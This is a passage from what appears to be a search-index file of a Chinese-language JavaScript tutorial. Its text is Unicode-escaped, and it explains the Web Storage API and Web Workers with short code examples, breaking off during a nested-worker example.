\u65b9\u6cd5\u7528\u4e8e\u6e05\u9664\u67d0\u4e2a\u952e\u540d\u5bf9\u5e94\u7684\u952e\u503c\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u5982\u679c\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 1 2 sessionStorage . removeItem ( 'key' ); localStorage . removeItem ( 'key' );","title":"Storage.removeItem()"},{"location":"bom/storage/#storageclear","text":"Storage.clear() \u65b9\u6cd5\u7528\u4e8e\u6e05\u9664\u6240\u6709\u4fdd\u5b58\u7684\u6570\u636e\u3002\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f undefined \u3002 1 2 window . sessionStorage . clear () window . localStorage . clear ()","title":"Storage.clear()"},{"location":"bom/storage/#storagekey","text":"Storage.key() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff08\u4ece\u96f6\u5f00\u59cb\uff09\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u5bf9\u5e94\u7684\u952e\u540d\u3002 1 2 window . sessionStorage . setItem ( 'key' , 'value' ); window . sessionStorage . key ( 0 ) // \"key\" \u7ed3\u5408\u4f7f\u7528 Storage.length \u5c5e\u6027\u548c Storage.key() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684\u952e\u3002 1 2 3 for ( var i = 0 ; i < window . localStorage . length ; i ++ ) { console . log ( localStorage . key ( i )); }","title":"Storage.key()"},{"location":"bom/storage/#storage_1","text":"Storage \u63a5\u53e3\u50a8\u5b58\u7684\u6570\u636e\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u4f1a\u89e6\u53d1 storage \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 1 window . addEventListener ( 'storage' , onStorageChange ); \u76d1\u542c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a event \u5b9e\u4f8b\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u4e86 StorageEvent \u63a5\u53e3\uff0c\u6709\u51e0\u4e2a\u7279\u6709\u7684\u5c5e\u6027\uff0c\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 StorageEvent.key \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d1\u751f\u53d8\u52a8\u7684\u952e\u540d\u3002\u5982\u679c storage \u4e8b\u4ef6\u662f\u7531 clear() \u65b9\u6cd5\u5f15\u8d77\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 StorageEvent.newValue \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65b0\u7684\u952e\u503c\u3002\u5982\u679c storage \u4e8b\u4ef6\u662f\u7531 clear() \u65b9\u6cd5\u6216\u5220\u9664\u8be5\u952e\u503c\u5bf9\u5f15\u53d1\u7684\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 StorageEvent.oldValue \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65e7\u7684\u952e\u503c\u3002\u5982\u679c\u8be5\u952e\u503c\u5bf9\u662f\u65b0\u589e\u7684\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 StorageEvent.storageArea \uff1a\u5bf9\u8c61\uff0c\u8fd4\u56de\u952e\u503c\u5bf9\u6240\u5728\u7684\u6574\u4e2a\u5bf9\u8c61\u3002\u4e5f\u8bf4\u662f\u8bf4\uff0c\u53ef\u4ee5\u4ece\u8fd9\u4e2a\u5c5e\u6027\u4e0a\u9762\u62ff\u5230\u5f53\u524d\u57df\u540d\u50a8\u5b58\u7684\u6240\u6709\u952e\u503c\u5bf9\u3002 StorageEvent.url \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u539f\u59cb\u89e6\u53d1 storage \u4e8b\u4ef6\u7684\u90a3\u4e2a\u7f51\u9875\u7684\u7f51\u5740\u3002 \u4e0b\u9762\u662f StorageEvent.key \u5c5e\u6027\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 function onStorageChange ( e ) { console . log ( e . key ); } window . addEventListener ( 'storage' , onStorageChange ); \u6ce8\u610f\uff0c\u8be5\u4e8b\u4ef6\u6709\u4e00\u4e2a\u5f88\u7279\u522b\u7684\u5730\u65b9\uff0c\u5c31\u662f\u5b83\u4e0d\u5728\u5bfc\u81f4\u6570\u636e\u53d8\u5316\u7684\u5f53\u524d\u9875\u9762\u89e6\u53d1\uff0c\u800c\u662f\u5728\u540c\u4e00\u4e2a\u57df\u540d\u7684\u5176\u4ed6\u7a97\u53e3\u89e6\u53d1\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6d4f\u89c8\u5668\u53ea\u6253\u5f00\u4e00\u4e2a\u7a97\u53e3\uff0c\u53ef\u80fd\u89c2\u5bdf\u4e0d\u5230\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u6bd4\u5982\u540c\u65f6\u6253\u5f00\u591a\u4e2a\u7a97\u53e3\uff0c\u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u7a97\u53e3\u5bfc\u81f4\u50a8\u5b58\u7684\u6570\u636e\u53d1\u751f\u6539\u53d8\u65f6\uff0c\u53ea\u6709\u5728\u5176\u4ed6\u7a97\u53e3\u624d\u80fd\u89c2\u5bdf\u5230\u76d1\u542c\u51fd\u6570\u7684\u6267\u884c\u3002\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u673a\u5236\uff0c\u5b9e\u73b0\u591a\u4e2a\u7a97\u53e3\u4e4b\u95f4\u7684\u901a\u4fe1\u3002","title":"storage \u4e8b\u4ef6"},{"location":"bom/storage/#_3","text":"Ryan Stewart\uff0c Introducing the HTML5 storage APIs Getting Started with LocalStorage Feross Aboukhadijeh, Introducing the HTML5 Hard Disk Filler\u2122 API Ben Summers, Inter-window messaging using localStorage Stack Overflow, Why does Internet Explorer fire the window \u201cstorage\u201d event on the window that stored the data? Stack Overflow, localStorage eventListener is not called","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/webworker/","text":"Web Worker \u00b6 \u6982\u8ff0 \u00b6 JavaScript \u8bed\u8a00\u91c7\u7528\u7684\u662f\u5355\u7ebf\u7a0b\u6a21\u578b\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6240\u6709\u4efb\u52a1\u53ea\u80fd\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u5b8c\u6210\uff0c\u4e00\u6b21\u53ea\u80fd\u505a\u4e00\u4ef6\u4e8b\u3002\u524d\u9762\u7684\u4efb\u52a1\u6ca1\u505a\u5b8c\uff0c\u540e\u9762\u7684\u4efb\u52a1\u53ea\u80fd\u7b49\u7740\u3002\u968f\u7740\u7535\u8111\u8ba1\u7b97\u80fd\u529b\u7684\u589e\u5f3a\uff0c\u5c24\u5176\u662f\u591a\u6838 CPU \u7684\u51fa\u73b0\uff0c\u5355\u7ebf\u7a0b\u5e26\u6765\u5f88\u5927\u7684\u4e0d\u4fbf\uff0c\u65e0\u6cd5\u5145\u5206\u53d1\u6325\u8ba1\u7b97\u673a\u7684\u8ba1\u7b97\u80fd\u529b\u3002 Web Worker \u7684\u4f5c\u7528\uff0c\u5c31\u662f\u4e3a JavaScript \u521b\u9020\u591a\u7ebf\u7a0b\u73af\u5883\uff0c\u5141\u8bb8\u4e3b\u7ebf\u7a0b\u521b\u5efa Worker \u7ebf\u7a0b\uff0c\u5c06\u4e00\u4e9b\u4efb\u52a1\u5206\u914d\u7ed9\u540e\u8005\u8fd0\u884c\u3002\u5728\u4e3b\u7ebf\u7a0b\u8fd0\u884c\u7684\u540c\u65f6\uff0cWorker \u7ebf\u7a0b\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u4e24\u8005\u4e92\u4e0d\u5e72\u6270\u3002\u7b49\u5230 Worker \u7ebf\u7a0b\u5b8c\u6210\u8ba1\u7b97\u4efb\u52a1\uff0c\u518d\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9\u4e3b\u7ebf\u7a0b\u3002\u8fd9\u6837\u7684\u597d\u5904\u662f\uff0c\u4e00\u4e9b\u8ba1\u7b97\u5bc6\u96c6\u578b\u6216\u9ad8\u5ef6\u8fdf\u7684\u4efb\u52a1\u53ef\u4ee5\u4ea4\u7531 Worker \u7ebf\u7a0b\u6267\u884c\uff0c\u4e3b\u7ebf\u7a0b\uff08\u901a\u5e38\u8d1f\u8d23 UI \u4ea4\u4e92\uff09\u80fd\u591f\u4fdd\u6301\u6d41\u7545\uff0c\u4e0d\u4f1a\u88ab\u963b\u585e\u6216\u62d6\u6162\u3002 Worker \u7ebf\u7a0b\u4e00\u65e6\u65b0\u5efa\u6210\u529f\uff0c\u5c31\u4f1a\u59cb\u7ec8\u8fd0\u884c\uff0c\u4e0d\u4f1a\u88ab\u4e3b\u7ebf\u7a0b\u4e0a\u7684\u6d3b\u52a8\uff08\u6bd4\u5982\u7528\u6237\u70b9\u51fb\u6309\u94ae\u3001\u63d0\u4ea4\u8868\u5355\uff09\u6253\u65ad\u3002\u8fd9\u6837\u6709\u5229\u4e8e\u968f\u65f6\u54cd\u5e94\u4e3b\u7ebf\u7a0b\u7684\u901a\u4fe1\u3002\u4f46\u662f\uff0c\u8fd9\u4e5f\u9020\u6210\u4e86 Worker \u6bd4\u8f83\u8017\u8d39\u8d44\u6e90\uff0c\u4e0d\u5e94\u8be5\u8fc7\u5ea6\u4f7f\u7528\uff0c\u800c\u4e14\u4e00\u65e6\u4f7f\u7528\u5b8c\u6bd5\uff0c\u5c31\u5e94\u8be5\u5173\u95ed\u3002 Web Worker \u6709\u4ee5\u4e0b\u51e0\u4e2a\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \uff081\uff09 \u540c\u6e90\u9650\u5236 \u5206\u914d\u7ed9 Worker \u7ebf\u7a0b\u8fd0\u884c\u7684\u811a\u672c\u6587\u4ef6\uff0c\u5fc5\u987b\u4e0e\u4e3b\u7ebf\u7a0b\u7684\u811a\u672c\u6587\u4ef6\u540c\u6e90\u3002 \uff082\uff09 DOM \u9650\u5236 Worker \u7ebf\u7a0b\u6240\u5728\u7684\u5168\u5c40\u5bf9\u8c61\uff0c\u4e0e\u4e3b\u7ebf\u7a0b\u4e0d\u4e00\u6837\uff0c\u65e0\u6cd5\u8bfb\u53d6\u4e3b\u7ebf\u7a0b\u6240\u5728\u7f51\u9875\u7684 DOM \u5bf9\u8c61\uff0c\u4e5f\u65e0\u6cd5\u4f7f\u7528 document \u3001 window \u3001 parent \u8fd9\u4e9b\u5bf9\u8c61\u3002\u4f46\u662f\uff0cWorker \u7ebf\u7a0b\u53ef\u4ee5\u4f7f\u7528 navigator \u5bf9\u8c61\u548c location \u5bf9\u8c61\u3002 \uff083\uff09 \u5168\u5c40\u5bf9\u8c61\u9650\u5236 Worker \u7684\u5168\u5c40\u5bf9\u8c61 WorkerGlobalScope \uff0c\u4e0d\u540c\u4e8e\u7f51\u9875\u7684\u5168\u5c40\u5bf9\u8c61 Window \uff0c\u5f88\u591a\u63a5\u53e3\u62ff\u4e0d\u5230\u3002\u6bd4\u5982\uff0c\u7406\u8bba\u4e0a Worker \u7ebf\u7a0b\u4e0d\u80fd\u4f7f\u7528 console.log \uff0c\u56e0\u4e3a\u6807\u51c6\u91cc\u9762\u6ca1\u6709\u63d0\u5230 Worker \u7684\u5168\u5c40\u5bf9\u8c61\u5b58\u5728 console \u63a5\u53e3\uff0c\u53ea\u5b9a\u4e49\u4e86 Navigator \u63a5\u53e3\u548c Location \u63a5\u53e3\u3002\u4e0d\u8fc7\uff0c\u6d4f\u89c8\u5668\u5b9e\u9645\u4e0a\u652f\u6301 Worker \u7ebf\u7a0b\u4f7f\u7528 console.log \uff0c\u4fdd\u9669\u7684\u505a\u6cd5\u8fd8\u662f\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 \uff084\uff09 \u901a\u4fe1\u8054\u7cfb Worker \u7ebf\u7a0b\u548c\u4e3b\u7ebf\u7a0b\u4e0d\u5728\u540c\u4e00\u4e2a\u4e0a\u4e0b\u6587\u73af\u5883\uff0c\u5b83\u4eec\u4e0d\u80fd\u76f4\u63a5\u901a\u4fe1\uff0c\u5fc5\u987b\u901a\u8fc7\u6d88\u606f\u5b8c\u6210\u3002 \uff085\uff09 \u811a\u672c\u9650\u5236 Worker \u7ebf\u7a0b\u4e0d\u80fd\u6267\u884c alert() \u65b9\u6cd5\u548c confirm() \u65b9\u6cd5\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 XMLHttpRequest \u5bf9\u8c61\u53d1\u51fa AJAX \u8bf7\u6c42\u3002 \uff086\uff09 \u6587\u4ef6\u9650\u5236 Worker \u7ebf\u7a0b\u65e0\u6cd5\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0c\u5373\u4e0d\u80fd\u6253\u5f00\u672c\u673a\u7684\u6587\u4ef6\u7cfb\u7edf\uff08 file:// \uff09\uff0c\u5b83\u6240\u52a0\u8f7d\u7684\u811a\u672c\uff0c\u5fc5\u987b\u6765\u81ea\u7f51\u7edc\u3002 \u57fa\u672c\u7528\u6cd5 \u00b6 \u4e3b\u7ebf\u7a0b \u00b6 \u4e3b\u7ebf\u7a0b\u91c7\u7528 new \u547d\u4ee4\uff0c\u8c03\u7528 Worker() \u6784\u9020\u51fd\u6570\uff0c\u65b0\u5efa\u4e00\u4e2a Worker \u7ebf\u7a0b\u3002 1 var worker = new Worker ( 'work.js' ); Worker() \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5c31\u662f Worker \u7ebf\u7a0b\u6240\u8981\u6267\u884c\u7684\u4efb\u52a1\u3002\u7531\u4e8e Worker \u4e0d\u80fd\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0c\u6240\u4ee5\u8fd9\u4e2a\u811a\u672c\u5fc5\u987b\u6765\u81ea\u7f51\u7edc\u3002\u5982\u679c\u4e0b\u8f7d\u6ca1\u6709\u6210\u529f\uff08\u6bd4\u5982404\u9519\u8bef\uff09\uff0cWorker \u5c31\u4f1a\u9ed8\u9ed8\u5730\u5931\u8d25\u3002 \u7136\u540e\uff0c\u4e3b\u7ebf\u7a0b\u8c03\u7528 worker.postMessage() \u65b9\u6cd5\uff0c\u5411 Worker \u53d1\u6d88\u606f\u3002 1 2 worker . postMessage ( 'Hello World' ); worker . postMessage ({ method : 'echo' , args : [ 'Work' ]}); worker.postMessage() \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u5c31\u662f\u4e3b\u7ebf\u7a0b\u4f20\u7ed9 Worker \u7684\u6570\u636e\u3002\u5b83\u53ef\u4ee5\u662f\u5404\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u5305\u62ec\u4e8c\u8fdb\u5236\u6570\u636e\u3002 \u63a5\u7740\uff0c\u4e3b\u7ebf\u7a0b\u901a\u8fc7 worker.onmessage \u6307\u5b9a\u76d1\u542c\u51fd\u6570\uff0c\u63a5\u6536\u5b50\u7ebf\u7a0b\u53d1\u56de\u6765\u7684\u6d88\u606f\u3002 1 2 3 4 5 6 7 8 worker . onmessage = function ( event ) { doSomething ( event . data ); } function doSomething () { // \u6267\u884c\u4efb\u52a1 worker . postMessage ( 'Work done!' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e8b\u4ef6\u5bf9\u8c61\u7684 data \u5c5e\u6027\u53ef\u4ee5\u83b7\u53d6 Worker \u53d1\u6765\u7684\u6570\u636e\u3002 Worker \u5b8c\u6210\u4efb\u52a1\u4ee5\u540e\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u53ef\u4ee5\u628a\u5b83\u5173\u6389\u3002 1 worker . terminate (); Worker \u7ebf\u7a0b \u00b6 Worker \u7ebf\u7a0b\u5185\u90e8\u9700\u8981\u6709\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u76d1\u542c message \u4e8b\u4ef6\u3002 1 2 3 self . addEventListener ( 'message' , function ( e ) { self . postMessage ( 'You said: ' + e . data ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c self \u4ee3\u8868\u5b50\u7ebf\u7a0b\u81ea\u8eab\uff0c\u5373\u5b50\u7ebf\u7a0b\u7684\u5168\u5c40\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u7b49\u540c\u4e8e\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // \u5199\u6cd5\u4e00 this . addEventListener ( 'message' , function ( e ) { this . postMessage ( 'You said: ' + e . data ); }, false ); // \u5199\u6cd5\u4e8c addEventListener ( 'message' , function ( e ) { postMessage ( 'You said: ' + e . data ); }, false ); \u9664\u4e86\u4f7f\u7528 self.addEventListener() \u6307\u5b9a\u76d1\u542c\u51fd\u6570\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 self.onmessage \u6307\u5b9a\u3002\u76d1\u542c\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u5b83\u7684 data \u5c5e\u6027\u5305\u542b\u4e3b\u7ebf\u7a0b\u53d1\u6765\u7684\u6570\u636e\u3002 self.postMessage() \u65b9\u6cd5\u7528\u6765\u5411\u4e3b\u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002 \u6839\u636e\u4e3b\u7ebf\u7a0b\u53d1\u6765\u7684\u6570\u636e\uff0cWorker \u7ebf\u7a0b\u53ef\u4ee5\u8c03\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 self . addEventListener ( 'message' , function ( e ) { var data = e . data ; switch ( data . cmd ) { case 'start' : self . postMessage ( 'WORKER STARTED: ' + data . msg ); break ; case 'stop' : self . postMessage ( 'WORKER STOPPED: ' + data . msg ); self . close (); // Terminates the worker. break ; default : self . postMessage ( 'Unknown command: ' + data . msg ); }; }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c self.close() \u7528\u4e8e\u5728 Worker \u5185\u90e8\u5173\u95ed\u81ea\u8eab\u3002 Worker \u52a0\u8f7d\u811a\u672c \u00b6 Worker \u5185\u90e8\u5982\u679c\u8981\u52a0\u8f7d\u5176\u4ed6\u811a\u672c\uff0c\u6709\u4e00\u4e2a\u4e13\u95e8\u7684\u65b9\u6cd5 importScripts() \u3002 1 importScripts ( 'script1.js' ); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u540c\u65f6\u52a0\u8f7d\u591a\u4e2a\u811a\u672c\u3002 1 importScripts ( 'script1.js' , 'script2.js' ); \u9519\u8bef\u5904\u7406 \u00b6 \u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u76d1\u542c Worker \u662f\u5426\u53d1\u751f\u9519\u8bef\u3002\u5982\u679c\u53d1\u751f\u9519\u8bef\uff0cWorker \u4f1a\u89e6\u53d1\u4e3b\u7ebf\u7a0b\u7684 error \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 worker . onerror = function ( event ) { console . log ( 'ERROR: Line ' , event . lineno , ' in ' , event . filename , ': ' , event . message ); }; // \u6216\u8005 worker . addEventListener ( 'error' , function ( event ) { // ... }); Worker \u5185\u90e8\u4e5f\u53ef\u4ee5\u76d1\u542c error \u4e8b\u4ef6\u3002 \u5173\u95ed Worker \u00b6 \u4f7f\u7528\u5b8c\u6bd5\uff0c\u4e3a\u4e86\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\uff0c\u5fc5\u987b\u5173\u95ed Worker\u3002 1 2 3 4 5 // \u4e3b\u7ebf\u7a0b worker . terminate (); // Worker \u7ebf\u7a0b self . close (); \u6570\u636e\u901a\u4fe1 \u00b6 \u524d\u9762\u8bf4\u8fc7\uff0c\u4e3b\u7ebf\u7a0b\u4e0e Worker \u4e4b\u95f4\u7684\u901a\u4fe1\u5185\u5bb9\uff0c\u53ef\u4ee5\u662f\u6587\u672c\uff0c\u4e5f\u53ef\u4ee5\u662f\u5bf9\u8c61\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u79cd\u901a\u4fe1\u662f\u62f7\u8d1d\u5173\u7cfb\uff0c\u5373\u662f\u4f20\u503c\u800c\u4e0d\u662f\u4f20\u5740\uff0cWorker \u5bf9\u901a\u4fe1\u5185\u5bb9\u7684\u4fee\u6539\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u4e3b\u7ebf\u7a0b\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6d4f\u89c8\u5668\u5185\u90e8\u7684\u8fd0\u884c\u673a\u5236\u662f\uff0c\u5148\u5c06\u901a\u4fe1\u5185\u5bb9\u4e32\u884c\u5316\uff0c\u7136\u540e\u628a\u4e32\u884c\u5316\u540e\u7684\u5b57\u7b26\u4e32\u53d1\u7ed9 Worker\uff0c\u540e\u8005\u518d\u5c06\u5b83\u8fd8\u539f\u3002 \u4e3b\u7ebf\u7a0b\u4e0e Worker \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u4ea4\u6362\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982 File\u3001Blob\u3001ArrayBuffer \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5728\u7ebf\u7a0b\u4e4b\u95f4\u53d1\u9001\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u4e3b\u7ebf\u7a0b var uInt8Array = new Uint8Array ( new ArrayBuffer ( 10 )); for ( var i = 0 ; i < uInt8Array . length ; ++ i ) { uInt8Array [ i ] = i * 2 ; // [0, 2, 4, 6, 8,...] } worker . postMessage ( uInt8Array ); // Worker \u7ebf\u7a0b self . onmessage = function ( e ) { var uInt8Array = e . data ; postMessage ( 'Inside worker.js: uInt8Array.toString() = ' + uInt8Array . toString ()); postMessage ( 'Inside worker.js: uInt8Array.byteLength = ' + uInt8Array . byteLength ); }; \u4f46\u662f\uff0c\u62f7\u8d1d\u65b9\u5f0f\u53d1\u9001\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4f1a\u9020\u6210\u6027\u80fd\u95ee\u9898\u3002\u6bd4\u5982\uff0c\u4e3b\u7ebf\u7a0b\u5411 Worker \u53d1\u9001\u4e00\u4e2a 500MB \u6587\u4ef6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6d4f\u89c8\u5668\u4f1a\u751f\u6210\u4e00\u4e2a\u539f\u6587\u4ef6\u7684\u62f7\u8d1d\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cJavaScript \u5141\u8bb8\u4e3b\u7ebf\u7a0b\u628a\u4e8c\u8fdb\u5236\u6570\u636e\u76f4\u63a5\u8f6c\u79fb\u7ed9\u5b50\u7ebf\u7a0b\uff0c\u4f46\u662f\u4e00\u65e6\u8f6c\u79fb\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u65e0\u6cd5\u518d\u4f7f\u7528\u8fd9\u4e9b\u4e8c\u8fdb\u5236\u6570\u636e\u4e86\uff0c\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u4fee\u6539\u6570\u636e\u7684\u9ebb\u70e6\u5c40\u9762\u3002\u8fd9\u79cd\u8f6c\u79fb\u6570\u636e\u7684\u65b9\u6cd5\uff0c\u53eb\u505a Transferable Objects \u3002\u8fd9\u4f7f\u5f97\u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u5feb\u901f\u628a\u6570\u636e\u4ea4\u7ed9 Worker\uff0c\u5bf9\u4e8e\u5f71\u50cf\u5904\u7406\u3001\u58f0\u97f3\u5904\u7406\u30013D \u8fd0\u7b97\u7b49\u5c31\u975e\u5e38\u65b9\u4fbf\u4e86\uff0c\u4e0d\u4f1a\u4ea7\u751f\u6027\u80fd\u8d1f\u62c5\u3002 \u5982\u679c\u8981\u76f4\u63a5\u8f6c\u79fb\u6570\u636e\u7684\u63a7\u5236\u6743\uff0c\u5c31\u8981\u4f7f\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 // Transferable Objects \u683c\u5f0f worker . postMessage ( arrayBuffer , [ arrayBuffer ]); // \u4f8b\u5b50 var ab = new ArrayBuffer ( 1 ); worker . postMessage ( ab , [ ab ]); \u540c\u9875\u9762\u7684 Web Worker \u00b6 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0cWorker \u8f7d\u5165\u7684\u662f\u4e00\u4e2a\u5355\u72ec\u7684 JavaScript \u811a\u672c\u6587\u4ef6\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u8f7d\u5165\u4e0e\u4e3b\u7ebf\u7a0b\u5728\u540c\u4e00\u4e2a\u7f51\u9875\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 <!DOCTYPE html> < body > < script id = \"worker\" type = \"app/worker\" > addEventListener ( 'message' , function () { postMessage ( 'some message' ); }, false ); </ script > </ body > </ html > \u4e0a\u9762\u662f\u4e00\u6bb5\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\uff0c\u6ce8\u610f\u5fc5\u987b\u6307\u5b9a <script> \u6807\u7b7e\u7684 type \u5c5e\u6027\u662f\u4e00\u4e2a\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\u7684\u503c\uff0c\u4e0a\u4f8b\u662f app/worker \u3002 \u7136\u540e\uff0c\u8bfb\u53d6\u8fd9\u4e00\u6bb5\u5d4c\u5165\u9875\u9762\u7684\u811a\u672c\uff0c\u7528 Worker \u6765\u5904\u7406\u3002 1 2 3 4 5 6 7 var blob = new Blob ([ document . querySelector ( '#worker' ). textContent ]); var url = window . URL . createObjectURL ( blob ); var worker = new Worker ( url ); worker . onmessage = function ( e ) { // e.data === 'some message' }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u5c06\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\u4ee3\u7801\uff0c\u8f6c\u6210\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff0c\u7136\u540e\u4e3a\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u5bf9\u8c61\u751f\u6210 URL\uff0c\u518d\u8ba9 Worker \u52a0\u8f7d\u8fd9\u4e2a URL\u3002\u8fd9\u6837\u5c31\u505a\u5230\u4e86\uff0c\u4e3b\u7ebf\u7a0b\u548c Worker \u7684\u4ee3\u7801\u90fd\u5728\u540c\u4e00\u4e2a\u7f51\u9875\u4e0a\u9762\u3002 \u5b9e\u4f8b\uff1aWorker \u7ebf\u7a0b\u5b8c\u6210\u8f6e\u8be2 \u00b6 \u6709\u65f6\uff0c\u6d4f\u89c8\u5668\u9700\u8981\u8f6e\u8be2\u670d\u52a1\u5668\u72b6\u6001\uff0c\u4ee5\u4fbf\u7b2c\u4e00\u65f6\u95f4\u5f97\u77e5\u72b6\u6001\u6539\u53d8\u3002\u8fd9\u4e2a\u5de5\u4f5c\u53ef\u4ee5\u653e\u5728 Worker \u91cc\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function createWorker ( f ) { var blob = new Blob ([ '(' + f . toString () + ')()' ]); var url = window . URL . createObjectURL ( blob ); var worker = new Worker ( url ); return worker ; } var pollingWorker = createWorker ( function ( e ) { var cache ; function compare ( new , old ) { ... }; setInterval ( function () { fetch ( '/my-api-endpoint' ). then ( function ( res ) { var data = res . json (); if ( ! compare ( data , cache )) { cache = data ; self . postMessage ( data ); } }) }, 1000 ) }); pollingWorker . onmessage = function () { // render data } pollingWorker . postMessage ( 'init' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cWorker \u6bcf\u79d2\u949f\u8f6e\u8be2\u4e00\u6b21\u6570\u636e\uff0c\u7136\u540e\u8ddf\u7f13\u5b58\u505a\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u4e00\u81f4\uff0c\u5c31\u8bf4\u660e\u670d\u52a1\u7aef\u6709\u4e86\u65b0\u7684\u53d8\u5316\uff0c\u56e0\u6b64\u5c31\u8981\u901a\u77e5\u4e3b\u7ebf\u7a0b\u3002 \u5b9e\u4f8b\uff1a Worker \u65b0\u5efa Worker \u00b6 Worker \u7ebf\u7a0b\u5185\u90e8\u8fd8\u80fd\u518d\u65b0\u5efa Worker \u7ebf\u7a0b\uff08\u76ee\u524d\u53ea\u6709 Firefox \u6d4f\u89c8\u5668\u652f\u6301\uff09\u3002\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u5c06\u4e00\u4e2a\u8ba1\u7b97\u5bc6\u96c6\u7684\u4efb\u52a1\uff0c\u5206\u914d\u523010\u4e2a Worker\u3002 \u4e3b\u7ebf\u7a0b\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 var worker = new Worker ( 'worker.js' ); worker . onmessage = function ( event ) { document . getElementById ( 'result' ). textContent = event . data ; }; Worker \u7ebf\u7a0b\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 